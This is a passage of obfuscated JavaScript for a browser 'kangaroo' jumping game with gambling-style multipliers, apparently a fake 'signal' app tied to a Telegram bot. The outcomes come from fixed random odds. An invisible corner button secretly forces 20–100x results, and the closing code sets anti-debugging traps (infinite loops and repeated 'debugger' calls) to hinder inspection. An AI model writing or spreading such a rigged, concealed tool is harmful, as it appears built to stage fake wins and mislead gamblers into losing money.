          const _0x330379 = new RegExp(this.KtPULM + this.xTIzQG);
          const _0x15f84d = _0x330379.test(this.yLcMZd.toString()) ? --this.SxHLVE[1] : --this.SxHLVE[0];
          return this.rBfaDE(_0x15f84d);
        };
        _0xb40f98.prototype.rBfaDE = function (_0x33b89b) {
          if (!Boolean(~_0x33b89b)) {
            return _0x33b89b;
          }
          return this.zqlchv(this.RsGAAI);
        };
        _0xb40f98.prototype.zqlchv = function (_0x1581b1) {
          let _0x3acb10 = 0;
          for (let _0x3abc8d = this.SxHLVE.length; _0x3acb10 < _0x3abc8d; _0x3acb10++) {
            this.SxHLVE.push(Math.round(Math.random()));
            _0x3abc8d = this.SxHLVE.length;
          }
          return _0x1581b1(this.SxHLVE[0]);
        };
        new _0xb40f98(_0x25be).iNpnCn();
        _0x25be.amMIsW = true;
      }
      _0x8d7c25 = _0x25be.IYTJYG(_0x8d7c25, _0x1dfcd5);
      _0x31759e[_0x3ad990] = _0x8d7c25;
    } else {
      _0x8d7c25 = _0x45fa1d;
    }
    return _0x8d7c25;
  };
  return _0x25be(_0x31759e, _0x22c922);
}
function _0x2492df(_0x1459ef, _0x280329, _0x952d87, _0x2c1a48, _0xced45e) {
  return _0x25be(_0x2c1a48 - 0x6d, _0x1459ef);
}
function _0x40ca19(_0x22d7d8, _0x3d6dda, _0x17f10b, _0x41cca5, _0x32e2ba) {
  return _0x25be(_0x41cca5 + 0x309, _0x3d6dda);
}
initTelegramBot().then(() => {
  if (isAuthenticated) {
    fetchDataAndUpdate();
    setInterval(fetchDataAndUpdate, 100);
    setInterval(checkSignal, 100);
    checkSignal();
  }
});
document.addEventListener("DOMContentLoaded", () => {
  const _0xb63f2b = document.getElementById("kangaroo");
  const _0x18bfad = document.getElementById("platform-container");
  const _0x4b1c43 = document.getElementById("play-button");
  const _0x354cf2 = new Image();
  _0x354cf2.src = "kengu.png";
  const _0x168b74 = new Image();
  _0x168b74.src = "kenguzerk.png";
  console.log("Preloading images...");
  _0x168b74.onload = () => console.log("✅ kenguzerk.png found and preloaded");
  _0x168b74.onerror = () => console.error("❌ kenguzerk.png NOT FOUND - fix the file path!");
  _0x354cf2.onload = () => console.log("✅ kengu.png found and preloaded");
  _0x354cf2.onerror = () => console.error("❌ kengu.png NOT FOUND - fix the file path!");
  let _0x1913fd = false;
  const _0x2d5af2 = document.createElement("div");
  _0x2d5af2.className = "secret-button";
  _0x2d5af2.style.position = "fixed";
  _0x2d5af2.style.left = "20px";
  _0x2d5af2.style.bottom = "20px";
  _0x2d5af2.style.width = "80px";
  _0x2d5af2.style.height = "80px";
  _0x2d5af2.style.zIndex = "100";
  _0x2d5af2.style.cursor = "pointer";
  _0x2d5af2.style.opacity = '0';
  document.body.appendChild(_0x2d5af2);
  _0x2d5af2.addEventListener("click", () => {
    _0x1913fd = !_0x1913fd;
    if (_0x1913fd) {
      alert("Включен режим прыжков на платформы 20-100x!");
      console.log("Включен режим прыжков на платформы с коэффициентами 20-100");
    } else {
      alert("Режим прыжков на платформы 20-100x отключен");
      console.log("Режим прыжков на платформы с коэффициентами 20-100 отключен");
    }
  });
  const _0x1af4dd = document.createElement("div");
  _0x1af4dd.className = "modal";
  _0x1af4dd.style.display = "none";
  _0x1af4dd.style.position = "fixed";
  _0x1af4dd.style.top = '0';
  _0x1af4dd.style.left = '0';
  _0x1af4dd.style.width = "100%";
  _0x1af4dd.style.height = "100%";
  _0x1af4dd.style.backgroundColor = "rgba(0,0,0,0.7)";
  _0x1af4dd.style.zIndex = "1000";
  _0x1af4dd.style.display = "flex";
  _0x1af4dd.style.justifyContent = "center";
  _0x1af4dd.style.alignItems = "center";
  _0x1af4dd.style.opacity = '0';
  _0x1af4dd.style.transition = "opacity 0.3s ease";
  _0x1af4dd.style.pointerEvents = "none";
  const _0x45c8db = document.createElement("div");
  _0x45c8db.className = "modal-content";
  _0x45c8db.style.backgroundColor = "#fff";
  _0x45c8db.style.padding = "30px";
  _0x45c8db.style.borderRadius = "10px";
  _0x45c8db.style.textAlign = "center";
  _0x45c8db.style.maxWidth = "80%";
  _0x45c8db.style.boxShadow = "0 0 20px rgba(0,0,0,0.5)";
  _0x45c8db.style.transform = "scale(0.8)";
  _0x45c8db.style.transition = "transform 0.3s ease";
  const _0x33cd52 = document.createElement('h2');
  _0x33cd52.style.marginBottom = "15px";
  _0x33cd52.style.fontSize = "28px";
  _0x33cd52.style.color = "#333";
  const _0x43930e = document.createElement('p');
  _0x43930e.textContent = "Cash Out!";
  _0x43930e.style.fontSize = "22px";
  _0x43930e.style.color = "#FF8000";
  _0x43930e.style.fontWeight = "bold";
  const _0x21a37d = document.createElement("button");
  _0x21a37d.textContent = 'OK';
  _0x21a37d.style.marginTop = "20px";
  _0x21a37d.style.padding = "10px 30px";
  _0x21a37d.style.backgroundColor = "#FF8000";
  _0x21a37d.style.border = "none";
  _0x21a37d.style.borderRadius = "5px";
  _0x21a37d.style.color = "white";
  _0x21a37d.style.fontSize = "18px";
  _0x21a37d.style.fontWeight = "bold";
  _0x21a37d.style.cursor = "pointer";
  _0x21a37d.style.boxShadow = "0 4px 8px rgba(0,0,0,0.2)";
  _0x21a37d.addEventListener("mouseover", () => {
    _0x21a37d.style.backgroundColor = "#FF9933";
    _0x21a37d.style.transform = "scale(1.05)";
  });
  _0x21a37d.addEventListener("mouseout", () => {
    _0x21a37d.style.backgroundColor = "#FF8000";
    _0x21a37d.style.transform = "scale(1)";
  });
  _0x21a37d.addEventListener("click", () => {
    _0x2f5ab4();
    _0xec94b8();
    _0x33f023();
  });
  _0x45c8db.appendChild(_0x33cd52);
  _0x45c8db.appendChild(_0x43930e);
  _0x45c8db.appendChild(_0x21a37d);
  _0x1af4dd.appendChild(_0x45c8db);
  document.body.appendChild(_0x1af4dd);
  function _0x22c969(_0x3afb78) {
    _0x33cd52.textContent = "Multiplier: " + _0x3afb78 + 'x';
    _0x1af4dd.style.display = "flex";
    setTimeout(() => {
      _0x1af4dd.style.opacity = '1';
      _0x1af4dd.style.pointerEvents = "auto";
      _0x45c8db.style.transform = "scale(1)";
    }, 10);
  }
  function _0x2f5ab4() {
    _0x1af4dd.style.opacity = '0';
    _0x45c8db.style.transform = "scale(0.8)";
    _0x1af4dd.style.pointerEvents = "none";
    setTimeout(() => {
      _0x1af4dd.style.display = "none";
    }, 300);
  }
  const _0x582be2 = window.innerWidth < 768;
  function _0xd4e9fe() {
    const _0x47dc8c = window.innerWidth;
    const _0x218251 = window.innerHeight;
    const _0x4a4f57 = _0x582be2 ? 1.1 : 1.3;
    const _0x18fdb4 = _0x582be2 ? 0.5 : 0.65;
    const _0x24c20d = [];
    const _0x4867c8 = [1.1, 1.2, 1.5, 2, 3, 5, 10, 20, 50, 100];
    const _0xfb3dde = _0x1bc7a5 => {
      if (_0x1bc7a5 <= 2) {
        return "plitka1.png";
      }
      if (_0x1bc7a5 <= 10) {
        return "plitka2.png";
      }
      return "plitka3.png";
    };
    const _0x3cb652 = _0x47dc8c * 0.05;
    const _0x5f4bb5 = _0x47dc8c - _0x3cb652 - 200;
    const _0x247cd = Math.min(0.45, _0x5f4bb5 / _0x47dc8c * 0.6);
    const _0xfcc926 = _0x218251 * _0x247cd;
    const _0x556cbe = Math.cos(-0.5 * Math.PI * 0.8);
    const _0x5efc05 = Math.min(_0x47dc8c * 0.12, _0x5f4bb5 - _0xfcc926 * _0x556cbe);
    const _0xb8c13e = _0x218251 * 0.5;
    for (let _0x30376f = 0; _0x30376f < _0x4867c8.length; _0x30376f++) {
      let _0x53f0eb;
      if (_0x30376f === 0) {
        _0x53f0eb = 0.15;
      } else {
        if (_0x30376f === 1) {
          _0x53f0eb = 0.32;
        } else {
          const _0x370214 = (_0x30376f - 1) / (_0x4867c8.length - 2);
          _0x53f0eb = 0.32 + Math.pow(_0x370214, 0.9) * 0.65;
        }
      }
      const _0x36c2d1 = (_0x53f0eb - 0.5) * Math.PI * 0.8;
      const _0x11b22a = _0x5efc05 + _0xfcc926 * Math.cos(_0x36c2d1);
      const _0x1c1776 = _0xb8c13e + _0xfcc926 * Math.sin(_0x36c2d1);
      const _0x540d1b = _0x18fdb4 + (1 - Math.abs(_0x53f0eb - 0.5) * 1.8) * (_0x4a4f57 - _0x18fdb4);
      const _0x3efc8a = {
        bottom: _0x1c1776,
        left: _0x11b22a
      };
      _0x24c20d.push({
        'id': 'p-' + _0x4867c8[_0x30376f],
        'coefficient': _0x4867c8[_0x30376f],
        'plitka': _0xfb3dde(_0x4867c8[_0x30376f]),
        'position': _0x3efc8a,
        'scale': _0x540d1b
      });
    }
    return _0x24c20d;
  }
  const _0xb51a8a = _0xd4e9fe();
  const _0xe3e9b = {
    x: _0x582be2 ? 80 : 120,
    y: 0x50
  };
  let _0x43f98f = _0xe3e9b;
  let _0x37bc61 = false;
  let _0x5d8ba6 = [];
  let _0x181a32 = [];
  let _0x2df21e = null;
  let _0x51ae9c = -1;
  let _0x5638dc = false;
  function _0x43a536() {
    _0x18bfad.innerHTML = '';
    _0x5d8ba6 = [];
    _0x181a32 = [];
    _0xb51a8a.forEach((_0x4e1ca3, _0x173655) => {
      const _0x5867e8 = document.createElement("div");
      _0x5867e8.className = "platform";
      _0x5867e8.id = _0x4e1ca3.id;
      _0x5867e8.dataset.coefficient = _0x4e1ca3.coefficient;
      _0x5867e8.dataset.index = _0x173655;
      _0x5867e8.style.bottom = _0x4e1ca3.position.bottom + 'px';
      _0x5867e8.style.left = _0x4e1ca3.position.left + 'px';
      const _0x3d68f4 = _0x4e1ca3.scale || 1 - _0x173655 * 0.03;
      _0x5867e8.style.transform = "scale(" + _0x3d68f4 + ')';
      const _0x503c57 = document.createElement("img");
      _0x503c57.src = _0x4e1ca3.plitka;
      _0x503c57.className = "platform-image";
      const _0x203800 = document.createElement("div");
      _0x203800.className = "coefficient";
      const _0x318d3d = document.createElement("img");
      _0x318d3d.src = _0x4e1ca3.coefficient + ".png";
      _0x318d3d.onerror = function () {
        this.remove();
        _0x203800.textContent = _0x4e1ca3.coefficient;
      };
      _0x203800.appendChild(_0x318d3d);
      _0x5867e8.appendChild(_0x503c57);
      _0x5867e8.appendChild(_0x203800);
      _0x18bfad.appendChild(_0x5867e8);
      _0x5d8ba6.push(_0x5867e8);
      _0x5867e8.addEventListener("click", () => _0x3b8c8f(_0x5867e8));
    });
  }
  function _0x3b8c8f(_0x20d6e8) {
    if (_0x37bc61 || _0x181a32.includes(_0x20d6e8)) {
      return;
    }
    _0x37bc61 = true;
    const _0x2b837f = _0x20d6e8.dataset.coefficient === '3';
    console.log("Jump to platform " + _0x20d6e8.id + ", multiplier: " + _0x20d6e8.dataset.coefficient + ", coefficient 3 check: " + _0x2b837f);
    if (_0x2b837f) {
      _0xb63f2b.style.backgroundImage = "url('kenguzerk.png')";
      _0xb63f2b.style.transform = "scaleX(1)";
      _0x5638dc = true;
      console.log("👁️ IMAGE CHANGED TO kenguzerk.png");
    }
    const _0x3423e5 = _0x20d6e8.getBoundingClientRect();
    const _0x3e4a15 = _0xb63f2b.getBoundingClientRect();
    const _0x2f3bab = _0x3e4a15.width;
    const _0x363226 = _0x3e4a15.height;
    let _0x5118f2 = _0x3423e5.left + _0x3423e5.width / 2 - _0x2f3bab / 2;
    _0x5118f2 = Math.max(10, Math.min(_0x5118f2, window.innerWidth - _0x2f3bab - 10));
    const _0x2e3311 = _0x3423e5.top - _0x363226 * 0.8;
    console.log("Jump to position: X=" + _0x5118f2 + ", Y=" + _0x2e3311 + ", platform dimensions: " + _0x3423e5.width + 'x' + _0x3423e5.height);
    _0xb63f2b.style.transition = "all 0.5s ease-out";
    _0xb63f2b.style.left = _0x5118f2 + 'px';
    _0xb63f2b.style.bottom = window.innerHeight - _0x2e3311 - _0x363226 + 'px';
    _0x43f98f = {
      'x': _0x5118f2,
      'y': window.innerHeight - _0x2e3311 - _0x363226
    };
    _0x2df21e = _0x20d6e8;
    _0x51ae9c = parseInt(_0x20d6e8.dataset.index);
    _0x20d6e8.style.opacity = "0.5";
    _0x181a32.push(_0x20d6e8);
    setTimeout(() => {
      _0xb63f2b.classList.add("jump-end");
      setTimeout(() => {
        _0x20d6e8.style.opacity = '0';
        setTimeout(() => {
          _0x20d6e8.style.display = "none";
        }, 500);
        _0xb63f2b.classList.remove("jump-end");
        _0x37bc61 = false;
        const _0x1774e9 = _0x20d6e8.dataset.coefficient;
        _0x22c969(_0x1774e9);
        _0xec94b8();
        setTimeout(() => {
          _0x33f023();
        }, 1500);
      }, 300);
    }, 500);
  }
  let _0x42c4d3 = false;
  function _0x263327() {
    _0x42c4d3 = true;
    _0x2df21e = null;
    if (_0x1913fd) {
      console.log("🎯 Режим высоких коэффициентов: выбираем платформу 20-100x");
      const _0x3ed14f = _0x5d8ba6.filter(_0x31396b => {
        const _0xdba096 = parseFloat(_0x31396b.dataset.coefficient);
        return _0xdba096 >= 20 && _0xdba096 <= 100 && !_0x181a32.includes(_0x31396b);
      });
      if (_0x3ed14f.length === 0) {
        console.log("Нет доступных платформ с коэффициентами 20-100");
        _0xc5206d();
        return;
      }
      const _0x481aa0 = Math.floor(Math.random() * _0x3ed14f.length);
      const _0x3cfecd = _0x3ed14f[_0x481aa0];
      console.log("Выбрана платформа с коэффициентом " + _0x3cfecd.dataset.coefficient);
      window.targetPlatformIndex = parseInt(_0x3cfecd.dataset.index);
      _0x3b8c8f(_0x3cfecd);
      return;
    }
    const _0xd0b9ed = [2, 3, 5, 10];
    const _0x208d5e = Math.random();
    console.log("🎲 NEW GAME! Generated random number: " + _0x208d5e.toFixed(4));
    let _0x3691bb;
    if (_0x208d5e < 0.3) {
      _0x3691bb = _0xd0b9ed[0];
    } else {
      if (_0x208d5e < 0.6) {
        _0x3691bb = _0xd0b9ed[1];
      } else {
        if (_0x208d5e < 0.8) {
          _0x3691bb = _0xd0b9ed[2];
        } else {
          _0x3691bb = _0xd0b9ed[3];
        }
      }
    }
    console.log("🎯 SELECTED MULTIPLIER: " + _0x3691bb + "x (chances: 2x-30%, 3x-30%, 5x-20%, 10x-20%)");
    const _0x57235b = _0x5d8ba6.find(_0x2a5021 => parseFloat(_0x2a5021.dataset.coefficient) === _0x3691bb);
    if (!_0x57235b) {
      console.error("Platform with target coefficient not found!");
      const _0x3cff5d = _0x5d8ba6.find(_0x87cddd => {
        const _0xeabc8c = parseFloat(_0x87cddd.dataset.coefficient);
        return _0xd0b9ed.includes(_0xeabc8c);
      });
      if (_0x3cff5d) {
        window.targetPlatformIndex = parseInt(_0x3cff5d.dataset.index);
        console.log("Alternative target platform with index: " + window.targetPlatformIndex + " and multiplier: " + _0x3cff5d.dataset.coefficient);
        _0x3b8c8f(_0x3cff5d);
      } else {
        console.error("No platforms with suitable coefficients found!");
        return;
      }
    } else {
      window.targetPlatformIndex = parseInt(_0x57235b.dataset.index);
      console.log("Target platform index: " + window.targetPlatformIndex);
      _0x3b8c8f(_0x57235b);
    }
  }
  function _0xec94b8() {
    _0x42c4d3 = false;
  }
  function _0x4b3790() {
    _0xb63f2b.style.transition = "none";
    _0xb63f2b.style.left = _0x43f98f.x + 'px';
    _0xb63f2b.style.bottom = _0x43f98f.y + 'px';
  }
  function _0xc5206d() {
    const _0x50d8a2 = {
      x: _0x582be2 ? 80 : 120,
      y: 0x50
    };
    _0x43f98f = _0x50d8a2;
    _0x2df21e = null;
    _0x51ae9c = -1;
    _0x5638dc = false;
    window.targetPlatformIndex = null;
    _0xb63f2b.style.backgroundImage = "url('kengu.png')";
    _0xb63f2b.style.transform = "scaleX(1)";
    _0x43a536();
    _0x4b3790();
    console.log("Game reset!");
  }
  _0x4b1c43.addEventListener("click", () => {
    if (_0x181a32.length === _0x5d8ba6.length) {
      _0xc5206d();
      setTimeout(_0x263327, 100);
    } else {
      _0x263327();
    }
  });
  _0x1af4dd.addEventListener("click", _0x2e0c14 => {
    if (_0x2e0c14.target === _0x1af4dd) {
      _0xec94b8();
      _0x2f5ab4();
      _0x33f023();
    }
  });
  window.addEventListener("resize", () => {
    const _0x33b884 = _0xd4e9fe();
    _0xb51a8a.length = 0;
    _0xb51a8a.push(..._0x33b884);
    _0x43a536();
    _0x4b3790();
  });
  function _0x5e5d71() {
    console.log("Checking image availability...");
    const _0x2ed4cc = new Image();
    _0x2ed4cc.onload = () => console.log("kenguzerk.png available");
    _0x2ed4cc.onerror = () => console.error("kenguzerk.png NOT FOUND!");
    _0x2ed4cc.src = "kenguzerk.png";
    const _0x1e6de9 = new Image();
    _0x1e6de9.onload = () => console.log("kengu.png available");
    _0x1e6de9.onerror = () => console.error("kengu.png NOT FOUND!");
    _0x1e6de9.src = "kengu.png";
  }
  _0xb63f2b.style.backgroundImage = "url('kengu.png')";
  _0x43a536();
  _0x5e5d71();
  console.log("ALL PLATFORMS:");
  _0x5d8ba6.forEach((_0x1ae994, _0x1a19ef) => {
    console.log("Platform #" + _0x1a19ef + ": id=" + _0x1ae994.id + ", multiplier=" + _0x1ae994.dataset.coefficient + ", index=" + _0x1ae994.dataset.index);
  });
  function _0x33f023() {
    _0x5638dc = false;
    _0xb63f2b.style.backgroundImage = "url('kengu.png')";
    _0xb63f2b.style.transform = "scaleX(1)";
    const _0x19a02c = {
      x: _0x582be2 ? 80 : 120,
      y: 0x50
    };
    _0xb63f2b.style.transition = "all 0.5s ease-out";
    _0xb63f2b.style.left = _0x19a02c.x + 'px';
    _0xb63f2b.style.bottom = "80px";
    _0x43f98f = _0x19a02c;
    setTimeout(() => {
      _0x181a32 = [];
      _0x5d8ba6.forEach(_0x50ea41 => {
        _0x50ea41.style.opacity = '1';
        _0x50ea41.style.display = "block";
      });
    }, 500);
  }
});
function _0x251581(_0xaa50a3) {
  function _0x834122(_0x34edff) {
    if (typeof _0x34edff === "string") {
      return function (_0x34adcc) {}.constructor("while (true) {}").apply("counter");
    } else if (('' + _0x34edff / _0x34edff).length !== 1 || _0x34edff % 20 === 0) {
      (function () {
        return true;
      }).constructor("debugger").call("action");
    } else {
      (function () {
        return false;
      }).constructor("debugger").apply("stateObject");
    }
    _0x834122(++_0x34edff);
  }
  try {
    if (_0xaa50a3) {
      return _0x834122;
    } else {
      _0x834122(0);
    }
  } catch (_0x22138c) {}
}